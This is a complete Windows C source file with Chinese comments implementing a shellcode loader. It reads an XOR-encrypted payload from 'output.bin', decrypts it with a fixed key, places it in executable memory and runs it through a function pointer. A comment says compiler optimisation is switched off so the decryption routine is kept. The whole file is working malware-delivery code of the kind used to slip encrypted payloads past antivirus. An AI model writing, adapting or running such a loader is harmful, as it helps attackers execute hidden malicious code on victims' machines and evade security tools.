#include <windows.h>
#include <stdio.h>

// 禁用优化确保解密函数不被编译器优化掉
#pragma optimize("", off)
void xor_decrypt(BYTE* data, DWORD size, BYTE key) {
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key;
    }
}
#pragma optimize("", on)

int main() {
    const char* filename = "output.bin";
    const BYTE xorKey = 0xAA; // 必须与加密密钥一致

    // 1. 打开加密文件
    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] 无法打开 %s (错误: 0x%lX)\n", filename, GetLastError());
        return 1;
    }

    // 2. 获取文件大小
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[!] 获取文件大小失败 (错误: 0x%lX)\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    // 3. 分配可执行内存
    LPVOID shellcode = VirtualAlloc(
        NULL,
        fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!shellcode) {
        printf("[!] 内存分配失败 (错误: 0x%lX)\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    // 4. 读取加密内容
    DWORD bytesRead;
    if (!ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[!] 读取失败 (错误: 0x%lX)\n", GetLastError());
        VirtualFree(shellcode, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);

    // 5. 解密shellcode
    printf("[+] 解密Shellcode (大小: %lu bytes, 密钥: 0x%02X)...\n", fileSize, xorKey);
    xor_decrypt((BYTE*)shellcode, fileSize, xorKey);

    // 6. 确保指令缓存刷新
    FlushInstructionCache(GetCurrentProcess(), shellcode, fileSize);

    // 7. 执行shellcode
    printf("[+] 执行Shellcode (地址: 0x%p)...\n", shellcode);

    __try {
        // 直接调用shellcode
        ((void(*)())shellcode)();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[!] Shellcode执行异常 (代码: 0x%lX)\n", GetExceptionCode());
        VirtualFree(shellcode, 0, MEM_RELEASE);
        return 1;
    }

    // 8. 清理
    VirtualFree(shellcode, 0, MEM_RELEASE);
    printf("[+] 执行完成\n");

    return 0;
}